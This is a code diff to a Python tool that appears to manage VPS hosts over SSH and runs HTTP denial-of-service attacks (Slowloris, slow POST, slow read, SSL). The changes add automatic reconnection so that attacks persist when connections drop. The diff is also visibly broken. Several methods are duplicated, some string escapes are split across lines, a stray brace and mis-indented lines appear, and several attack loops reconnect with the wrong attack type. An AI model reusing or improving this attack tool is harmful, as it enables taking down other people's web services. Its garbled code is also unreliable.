@@ -797,6 +797,23 @@ class SSHManager:
         self.security_manager = security_manager
         self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
         self.cache_lock = threading.Lock()
+
+    def execute_simple_command(self, ip, command, timeout=60):
+        """Execute command with simplified error handling"""
+        if ip not in self.connections:
+            return False, "No connection to VPS"
+        
+        try:
+            stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
+            exit_status = stdout.channel.recv_exit_status()
+            output = stdout.read().decode('utf-8', errors='replace')
+            error = stderr.read().decode('utf-8', errors='replace')
+            
+            return (exit_status == 0), output if exit_status == 0 else error
+            
+        except Exception as e:
+            return False, str(e)
+
     
     def connect_vps(self, ip, username, encrypted_password, port=22, timeout=25):
         """Connect to a VPS with comprehensive error handling"""
@@ -1109,38 +1126,21 @@ class SSHManager:
         if ip not in self.connections:
             return None
         try:
-            cmd = textwrap.dedent("""\
-            /usr/bin/env bash -s <<'BASH'
-            set -e
-            export LC_ALL=C.UTF-8 LANG=C.UTF-8
-            
-            hostname_val=$(hostname)
-            os_val=$(awk -F= '/^PRETTY_NAME=/{print $2}' /etc/os-release | tr -d '"')
-            kernel_val=$(uname -r)
-            cpu_val=$(awk -F: '/model name|Processor/ {print $2; exit}' /proc/cpuinfo | sed 's/^ *//')
-            cpu_cores_val=$(grep -c '^processor' /proc/cpuinfo || nproc)
-            mem_total_val=$(awk '/MemTotal:/ {printf "%.0f MiB", $2/1024}' /proc/meminfo)
-            mem_used_val=$(free -m | awk '/Mem:/ {printf "%d MiB", $3}')
-            disk_total_val=$(df -h / | awk 'NR==2{print $2}')
-            disk_used_val=$(df -h / | awk 'NR==2{print $3}')
-            python_ver_val=$(python3 --version 2>&1 || true)
-            uptime_val=$(uptime -p)
-            
-            printf '{'
-            printf '"hostname":"%s",' "$hostname_val"
-            printf '"os":"%s",' "$os_val"
-            printf '"kernel":"%s",' "$kernel_val"
-            printf '"cpu":"%s",' "$cpu_val"
-            printf '"cpu_cores":%s,' "$cpu_cores_val"
-            printf '"memory_total":"%s",' "$mem_total_val"
-            printf '"memory_used":"%s",' "$mem_used_val"
-            printf '"disk_total":"%s",' "$disk_total_val"
-            printf '"disk_used":"%s",' "$disk_used_val"
-            printf '"python_version":"%s",' "$python_ver_val"
-            printf '"uptime":"%s"' "$uptime_val"
-            printf '}\n'
-            BASH
-            """)
+            cmd = """bash -c '
+hostname_val=$(hostname)
+os_val=$(cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
+kernel_val=$(uname -r)
+cpu_val=$(cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2 | sed "s/^ *//")
+cpu_cores_val=$(nproc)
+mem_total_val=$(free -m | awk "/MemTotal:/ {printf "%.0f MiB", \$2/1024}")
+mem_used_val=$(free -m | awk "/Mem:/ {printf "%d MiB", \$3}")
+disk_total_val=$(df -h / | awk "NR==2{print \$2}")
+disk_used_val=$(df -h / | awk "NR==2{print \$3}")
+python_ver_val=$(python3 --version 2>&1 || echo "Not available")
+uptime_val=$(uptime -p)
+
+echo "{"hostname":"$hostname_val","os":"$os_val","kernel":"$kernel_val","cpu":"$cpu_val","cpu_cores":$cpu_cores_val,"memory_total":"$mem_total_val","memory_used":"$mem_used_val","disk_total":"$disk_total_val","disk_used":"$disk_used_val","python_version":"$python_ver_val","uptime":"$uptime_val"}"
+' """
             # Windows CRLF suka bikin heredoc halu
             cmd = cmd.replace('\r\n', '\n')
             if not cmd.endswith('\n'):
@@ -1209,7 +1209,7 @@ from urllib.parse import urlparse
 VERSION = "3.0"
 
 class SlowHTTPAttacker:
-    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
+    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/", persistent_mode=True):
         self.target = target
         self.port = port
         self.use_ssl = use_ssl
@@ -1217,12 +1217,24 @@ class SlowHTTPAttacker:
         self.running = False
         self.connections = []
         self.lock = threading.Lock()
+        self.persistent_mode = persistent_mode
+        
+        self.persistent_mode = persistent_mode
         self.stats = {
             "connections_active": 0,
             "packets_sent": 0,
             "bytes_sent": 0,
             "error_count": 0,
-            "response_codes": {}
+            "response_codes": {},
+            "total_connections": 0,
+            "total_reconnections": 0,
+            "start_time": time.time()
+        }
+        
+        # Connection configuration for auto-reconnect
+        self.connection_timeout = 5
+        self.retry_delay = 0.5
+        self.max_retry_attempts = 3
         }
         
         # Generate random user agent if not provided
@@ -1238,6 +1250,242 @@ class SlowHTTPAttacker:
         else:
             self.user_agent = user_agent
     
+    
+    def _create_socket_with_retry(self, retry_count=0):
+        """Create and connect socket with retry mechanism"""
+        try:
+            # Create socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(self.connection_timeout)
+            
+            # Connect to target
+            s.connect((self.target, self.port))
+            
+            # Wrap with SSL if needed
+            if self.use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                s = context.wrap_socket(s, server_hostname=self.target)
+            
+            return s
+            
+        except (socket.timeout, socket.error) as e:
+            if retry_count < self.max_retry_attempts:
+                time.sleep(self.retry_delay)
+                return self._create_socket_with_retry(retry_count + 1)
+            else:
+                return None
+        except Exception:
+            return None
+    
+    def _check_socket_health(self, s):
+        """Check if socket is still alive"""
+        try:
+            s.send(b'')
+            return True
+        except:
+            return False
+    
+    def _recreate_connection(self, attack_type="slowloris"):
+        """Recreate a failed connection"""
+        try:
+            # Create new socket
+            s = self._create_socket_with_retry()
+            if s is None:
+                return None
+            
+            # Send initial request based on attack type
+            if attack_type == "slowloris":
+                request = f"GET {self.path} HTTP/1.1
+"
+                request += f"Host: {self.target}
+"
+                request += f"User-Agent: {self.user_agent}
+"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+"
+                request += "Accept-Language: en-US,en;q=0.5
+"
+                request += "Accept-Encoding: gzip, deflate
+"
+                request += "Connection: keep-alive
+"
+                request += "Cache-Control: no-cache
+"
+                
+            elif attack_type == "slow_post":
+                content_length = random.randint(10000000, 1000000000)
+                request = f"POST {self.path} HTTP/1.1
+"
+                request += f"Host: {self.target}
+"
+                request += f"User-Agent: {self.user_agent}
+"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+"
+                request += "Accept-Language: en-US,en;q=0.5
+"
+                request += "Accept-Encoding: gzip, deflate
+"
+                request += "Connection: keep-alive
+"
+                request += "Content-Type: application/x-www-form-urlencoded
+"
+                request += f"Content-Length: {content_length}
+"
+                request += "
+"
+                
+            elif attack_type == "slow_read":
+                request = f"GET {self.path} HTTP/1.1
+"
+                request += f"Host: {self.target}
+"
+                request += f"User-Agent: {self.user_agent}
+"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+"
+                request += "Accept-Language: en-US,en;q=0.5
+"
+                request += "Accept-Encoding: gzip, deflate
+"
+                request += "Connection: keep-alive
+"
+                request += "X-Requested-With: XMLHttpRequest
+"
+                request += "
+"
+                
+                # Set small receive buffer for slow read
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
+            
+            # Send initial request
+            s.send(request.encode())
+            
+            # Update stats
+            with self.lock:
+                self.stats["total_connections"] += 1
+                self.stats["total_reconnections"] += 1
+                self.stats["connections_active"] += 1
+                self.stats["packets_sent"] += 1
+                self.stats["bytes_sent"] += len(request)
+            
+            return s
+            
+        except Exception:
+            return None
+    
+    def _print_enhanced_stats(self):
+        """Print enhanced statistics"""
+        elapsed_time = time.time() - self.stats["start_time"]
+        with self.lock:
+            active = self.stats["connections_active"]
+            total_conn = self.stats["total_connections"]
+            reconnections = self.stats["total_reconnections"]
+            packets = self.stats["packets_sent"]
+            errors = self.stats["error_count"]
+        
+        print(f"
+{'='*60}")
+        print(f"[STATS] Active: {active} | Total Conn: {total_conn} | Reconnects: {reconnections}")
+        print(f"[STATS] Packets: {packets} | Errors: {errors} | Time: {elapsed_time:.1f}s")
+        print(f"{'='*60}")
+
+
+    
+
+    def _create_socket_with_retry(self, retry_count=0):
+        """Create and connect socket with retry mechanism"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(self.connection_timeout)
+            s.connect((self.target, self.port))
+            if self.use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                s = context.wrap_socket(s, server_hostname=self.target)
+            return s
+        except (socket.timeout, socket.error) as e:
+            if retry_count < self.max_retry_attempts:
+                print(f"[!] Retry {retry_count + 1}/{self.max_retry_attempts}")
+                time.sleep(self.retry_delay)
+                return self._create_socket_with_retry(retry_count + 1)
+            return None
+        except Exception:
+            return None
+
+    def _check_socket_health(self, s):
+        """Check if socket is still alive"""
+        try:
+            s.send(b'')
+            return True
+        except:
+            return False
+
+    def _recreate_connection(self, attack_type="slowloris"):
+        """Recreate a failed connection"""
+        try:
+            s = self._create_socket_with_retry()
+            if s is None:
+                return None
+            if attack_type == "slowloris":
+                request = f"GET {self.path} HTTP/1.1\\r\\n"
+                request += f"Host: {self.target}\\r\\n"
+                request += f"User-Agent: {self.user_agent}\\r\\n"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                request += "Accept-Encoding: gzip, deflate\\r\\n"
+                request += "Connection: keep-alive\\r\\n"
+                request += "Cache-Control: no-cache\\r\\n"
+            elif attack_type == "slow_post":
+                content_length = random.randint(10000000, 1000000000)
+                request = f"POST {self.path} HTTP/1.1\\r\\n"
+                request += f"Host: {self.target}\\r\\n"
+                request += f"User-Agent: {self.user_agent}\\r\\n"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                request += "Accept-Encoding: gzip, deflate\\r\\n"
+                request += "Connection: keep-alive\\r\\n"
+                request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
+                request += f"Content-Length: {content_length}\\r\\n\\r\\n"
+            elif attack_type == "slow_read":
+                request = f"GET {self.path} HTTP/1.1\\r\\n"
+                request += f"Host: {self.target}\\r\\n"
+                request += f"User-Agent: {self.user_agent}\\r\\n"
+                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                request += "Accept-Encoding: gzip, deflate\\r\\n"
+                request += "Connection: keep-alive\\r\\n"
+                request += "X-Requested-With: XMLHttpRequest\\r\\n\\r\\n"
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
+            s.send(request.encode())
+            with self.lock:
+                self.stats["total_connections"] += 1
+                self.stats["total_reconnections"] += 1
+                self.stats["connections_active"] += 1
+                self.stats["packets_sent"] += 1
+                self.stats["bytes_sent"] += len(request)
+            print(f"[+] Reconnected (total: {len(self.connections) + 1})")
+            return s
+        except Exception as e:
+            return None
+
+    def _print_enhanced_stats(self):
+        """Print enhanced statistics"""
+        elapsed = time.time() - self.stats.get("start_time", time.time())
+        with self.lock:
+            active = self.stats["connections_active"]
+            total = self.stats.get("total_connections", 0)
+            reconn = self.stats.get("total_reconnections", 0)
+            packets = self.stats["packets_sent"]
+            errors = self.stats["error_count"]
+        print(f"\\n{'='*70}")
+        print(f"[STATS] Active: {active} | Total: {total} | Reconnects: {reconn}")
+        print(f"[STATS] Packets: {packets} | Errors: {errors} | Time: {elapsed:.1f}s")
+        print(f"{'='*70}\\n")
+
     def slowloris_attack(self, num_connections, delay, duration):
         """Slowloris (Keep-Alive) attack"""
         self.running = True
@@ -1342,50 +1590,16 @@ class SlowHTTPAttacker:
                         except:
                             pass
                         
-                        # Try to create a new connection
-                        try:
-                            # Create socket
-                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            new_s.settimeout(5)
-                            
-                            # Connect to target
-                            new_s.connect((self.target, self.port))
-                            
-                            # Wrap with SSL if needed
-                            if self.use_ssl:
-                                context = ssl.create_default_context()
-                                context.check_hostname = False
-                                context.verify_mode = ssl.CERT_NONE
-                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
-                            
-                            # Send initial HTTP request headers (incomplete)
-                            request = f"GET {self.path} HTTP/1.1\\r\\n"
-                            request += f"Host: {self.target}\\r\\n"
-                            request += f"User-Agent: {self.user_agent}\\r\\n"
-                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
-                            request += "Accept-Encoding: gzip, deflate\\r\\n"
-                            request += "Connection: keep-alive\\r\\n"
-                            request += "Cache-Control: no-cache\\r\\n"
-                            
-                            # Send initial headers
-                            new_s.send(request.encode())
-                            
-                            # Update stats
-                            with self.lock:
-                                self.stats["connections_active"] += 1
-                                self.stats["packets_sent"] += 1
-                                self.stats["bytes_sent"] += len(request)
-                            
-                            # Add to connections list
-                            self.connections.append(new_s)
-                            
-                        except Exception:
-                            # Failed to create new connection, just continue
-                            pass
+                        # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
-                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                self._print_enhanced_stats()
+                    print(f"[*] Active connections: {len(self.connections)}")
                 
                 # Sleep before sending more headers
                 time.sleep(delay)
@@ -1504,52 +1718,16 @@ class SlowHTTPAttacker:
                         except:
                             pass
                         
-                        # Try to create a new connection
-                        try:
-                            # Create socket
-                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            new_s.settimeout(5)
-                            
-                            # Connect to target
-                            new_s.connect((self.target, self.port))
-                            
-                            # Wrap with SSL if needed
-                            if self.use_ssl:
-                                context = ssl.create_default_context()
-                                context.check_hostname = False
-                                context.verify_mode = ssl.CERT_NONE
-                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
-                            
-                            # Send initial HTTP POST request headers
-                            request = f"POST {self.path} HTTP/1.1\\r\\n"
-                            request += f"Host: {self.target}\\r\\n"
-                            request += f"User-Agent: {self.user_agent}\\r\\n"
-                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
-                            request += "Accept-Encoding: gzip, deflate\\r\\n"
-                            request += "Connection: keep-alive\\r\\n"
-                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
-                            request += f"Content-Length: {content_length}\\r\\n"
-                            request += "\\r\\n"
-                            
-                            # Send initial headers
-                            new_s.send(request.encode())
-                            
-                            # Update stats
-                            with self.lock:
-                                self.stats["connections_active"] += 1
-                                self.stats["packets_sent"] += 1
-                                self.stats["bytes_sent"] += len(request)
-                            
-                            # Add to connections list
-                            self.connections.append(new_s)
-                            
-                        except Exception:
-                            # Failed to create new connection, just continue
-                            pass
+                        # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
-                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                self._print_enhanced_stats()
+                    print(f"[*] Active connections: {len(self.connections)}")
                 
                 # Sleep before sending more data
                 time.sleep(delay)
@@ -1667,55 +1845,16 @@ class SlowHTTPAttacker:
                             except:
                                 pass
                             
-                            # Try to create a new connection
-                            try:
-                                # Create socket
-                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                new_s.settimeout(10)  # Longer timeout for slow read
-                                
-                                # Set a very small receive buffer
-                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
-                                
-                                # Connect to target
-                                new_s.connect((self.target, self.port))
-                                
-                                # Wrap with SSL if needed
-                                if self.use_ssl:
-                                    context = ssl.create_default_context()
-                                    context.check_hostname = False
-                                    context.verify_mode = ssl.CERT_NONE
-                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
-                                
-                                # Send complete HTTP request with small window size
-                                request = f"GET {self.path} HTTP/1.1\\r\\n"
-                                request += f"Host: {self.target}\\r\\n"
-                                request += f"User-Agent: {self.user_agent}\\r\\n"
-                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
-                                request += "Accept-Encoding: gzip, deflate\\r\\n"
-                                request += "Connection: keep-alive\\r\\n"
-                                # Add a very small window size
-                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
-                                request += "\\r\\n"
-                                
-                                # Send request
-                                new_s.send(request.encode())
-                                
-                                # Update stats
-                                with self.lock:
-                                    self.stats["connections_active"] += 1
-                                    self.stats["packets_sent"] += 1
-                                    self.stats["bytes_sent"] += len(request)
-                                
-                                # Add to connections list
-                                self.connections.append(new_s)
-                                
-                            except Exception:
-                                # Failed to create new connection, just continue
-                                pass
+                            # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
-                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                self._print_enhanced_stats()
+                    print(f"[*] Active connections: {len(self.connections)}")
                 
                 # Sleep before reading more data
                 time.sleep(delay)
@@ -1754,6 +1893,7 @@ def main():
     parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
     parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
     parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
+    parser.add_argument("--no-persistent", action="store_true", help="Disable persistent mode (attack stops when connections fail)")
     parser.add_argument("--version", action="store_true", help="Show version and exit")
     
     args = parser.parse_args()
@@ -1780,7 +1920,7 @@ def main():
         port = args.port
     
     # Create attacker
-    attacker = SlowHTTPAttacker(target_host, port, use_ssl, path=path)
+    attacker = SlowHTTPAttacker(target_host, port, use_ssl, path=path, persistent_mode=not args.no_persistent)
     
     try:
         # Launch attack based on type
@@ -1961,50 +2101,16 @@ class AdvancedHTTPAttacker:
                         except:
                             pass
                         
-                        # Try to create a new connection
-                        try:
-                            # Create socket
-                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            new_s.settimeout(5)
-                            
-                            # Connect to target
-                            new_s.connect((self.target, self.port))
-                            
-                            # Wrap with SSL if needed
-                            if self.use_ssl:
-                                context = ssl.create_default_context()
-                                context.check_hostname = False
-                                context.verify_mode = ssl.CERT_NONE
-                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
-                            
-                            # Send initial HTTP request headers (incomplete)
-                            request = f"GET {self.path} HTTP/1.1\\r\\n"
-                            request += f"Host: {self.target}\\r\\n"
-                            request += f"User-Agent: {self.user_agent}\\r\\n"
-                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
-                            request += "Accept-Encoding: gzip, deflate\\r\\n"
-                            request += "Connection: keep-alive\\r\\n"
-                            request += "Cache-Control: no-cache\\r\\n"
-                            
-                            # Send initial headers
-                            new_s.send(request.encode())
-                            
-                            # Update stats
-                            with self.lock:
-                                self.stats["connections_active"] += 1
-                                self.stats["packets_sent"] += 1
-                                self.stats["bytes_sent"] += len(request)
-                            
-                            # Add to connections list
-                            self.connections.append(new_s)
-                            
-                        except Exception:
-                            # Failed to create new connection, just continue
-                            pass
+                        # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
-                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                self._print_enhanced_stats()
+                    print(f"[*] Active connections: {len(self.connections)}")
                 
                 # Sleep before sending more headers
                 time.sleep(delay)
@@ -2123,52 +2229,16 @@ class AdvancedHTTPAttacker:
                         except:
                             pass
                         
-                        # Try to create a new connection
-                        try:
-                            # Create socket
-                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            new_s.settimeout(5)
-                            
-                            # Connect to target
-                            new_s.connect((self.target, self.port))
-                            
-                            # Wrap with SSL if needed
-                            if self.use_ssl:
-                                context = ssl.create_default_context()
-                                context.check_hostname = False
-                                context.verify_mode = ssl.CERT_NONE
-                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
-                            
-                            # Send initial HTTP POST request headers
-                            request = f"POST {self.path} HTTP/1.1\\r\\n"
-                            request += f"Host: {self.target}\\r\\n"
-                            request += f"User-Agent: {self.user_agent}\\r\\n"
-                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
-                            request += "Accept-Encoding: gzip, deflate\\r\\n"
-                            request += "Connection: keep-alive\\r\\n"
-                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
-                            request += f"Content-Length: {content_length}\\r\\n"
-                            request += "\\r\\n"
-                            
-                            # Send initial headers
-                            new_s.send(request.encode())
-                            
-                            # Update stats
-                            with self.lock:
-                                self.stats["connections_active"] += 1
-                                self.stats["packets_sent"] += 1
-                                self.stats["bytes_sent"] += len(request)
-                            
-                            # Add to connections list
-                            self.connections.append(new_s)
-                            
-                        except Exception:
-                            # Failed to create new connection, just continue
-                            pass
+                        # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
-                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                self._print_enhanced_stats()
+                    print(f"[*] Active connections: {len(self.connections)}")
                 
                 # Sleep before sending more data
                 time.sleep(delay)
@@ -2286,55 +2356,16 @@ class AdvancedHTTPAttacker:
                             except:
                                 pass
                             
-                            # Try to create a new connection
-                            try:
-                                # Create socket
-                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                new_s.settimeout(10)  # Longer timeout for slow read
-                                
-                                # Set a very small receive buffer
-                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
-                                
-                                # Connect to target
-                                new_s.connect((self.target, self.port))
-                                
-                                # Wrap with SSL if needed
-                                if self.use_ssl:
-                                    context = ssl.create_default_context()
-                                    context.check_hostname = False
-                                    context.verify_mode = ssl.CERT_NONE
-                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
-                                
-                                # Send complete HTTP request with small window size
-                                request = f"GET {self.path} HTTP/1.1\\r\\n"
-                                request += f"Host: {self.target}\\r\\n"
-                                request += f"User-Agent: {self.user_agent}\\r\\n"
-                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
-                                request += "Accept-Encoding: gzip, deflate\\r\\n"
-                                request += "Connection: keep-alive\\r\\n"
-                                # Add a very small window size
-                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
-                                request += "\\r\\n"
-                                
-                                # Send request
-                                new_s.send(request.encode())
-                                
-                                # Update stats
-                                with self.lock:
-                                    self.stats["connections_active"] += 1
-                                    self.stats["packets_sent"] += 1
-                                    self.stats["bytes_sent"] += len(request)
-                                
-                                # Add to connections list
-                                self.connections.append(new_s)
-                                
-                            except Exception:
-                                # Failed to create new connection, just continue
-                                pass
+                            # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
-                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                self._print_enhanced_stats()
+                    print(f"[*] Active connections: {len(self.connections)}")
                 
                 # Sleep before reading more data
                 time.sleep(delay)
@@ -2618,46 +2649,12 @@ class AdvancedHTTPAttacker:
                         except:
                             pass
                         
-                        # Try to create a new connection
-                        try:
-                            # Create socket
-                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            new_s.settimeout(5)
-                            
-                            # Connect to target
-                            new_s.connect((self.target, self.port))
-                            
-                            # Wrap with SSL but with custom parameters
-                            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-                            context.check_hostname = False
-                            context.verify_mode = ssl.CERT_NONE
-                            
-                            # Enable all available ciphers
-                            context.set_ciphers("ALL")
-                            
-                            # Start SSL handshake
-                            ssl_sock = context.wrap_socket(new_s, server_hostname=self.target)
-                            
-                            # Send a minimal HTTP request to keep the connection alive
-                            request = f"GET {self.path} HTTP/1.1\\r\\n"
-                            request += f"Host: {self.target}\\r\\n"
-                            request += "Connection: keep-alive\\r\\n"
-                            request += "\\r\\n"
-                            
-                            ssl_sock.send(request.encode())
-                            
-                            # Update stats
-                            with self.lock:
-                                self.stats["connections_active"] += 1
-                                self.stats["packets_sent"] += 1
-                                self.stats["bytes_sent"] += len(request)
-                            
-                            # Add to connections list
-                            self.connections.append(ssl_sock)
-                            
-                        except Exception:
-                            # Failed to create new connection, just continue
-                            pass
+                        # Try to create a new connection (with persistent mode support)
+                            if self.persistent_mode:
+                                new_s = self._recreate_connection("slowloris")
+                                if new_s:
+                                    self.connections.append(new_s)
+                                    print(f"[+] Reconnected socket (total: {len(self.connections)})")
                 
                 # Print status update
                 print(f"[*] Status: {len(self.connections)} SSL connections active, {self.stats['packets_sent']} packets sent")
